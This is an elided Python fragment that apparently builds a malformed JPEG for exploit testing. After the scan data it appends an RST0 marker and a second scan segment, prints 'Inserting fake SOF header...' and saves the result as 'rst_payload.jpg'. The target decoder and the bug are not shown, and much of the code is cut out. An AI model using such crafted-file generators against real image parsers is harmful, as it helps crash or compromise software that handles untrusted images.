...
def jpeg_create_fake_sof(fp, sof, sos):
	fp.seek(0)
	jpeg_im = fp.read()[:-2] # Skip EOI
	...
	jpeg_im += pack(">H", JPEG_MARKER_RST0)
	jpeg_im += sos
	jpeg_im += pack(">H", JPEG_MARKER_EOI)

	f = open("rst_payload.jpg", "wb")
	f.write(jpeg_im)
	f.close()
...
while True:
	...
	if marker == JPEG_MARKER_SOI:
		...
		sof = jpeg_handle_sof(im_fp)
	elif marker == JPEG_MARKER_SOS:
		print "JPEG_MARKER_SOS"
		sos, sos_data = jpeg_handle_sos(im_fp)

		print "Inserting fake SOF header..."
		jpeg_create_fake_sof(im_fp, sof, sos_data)
		break
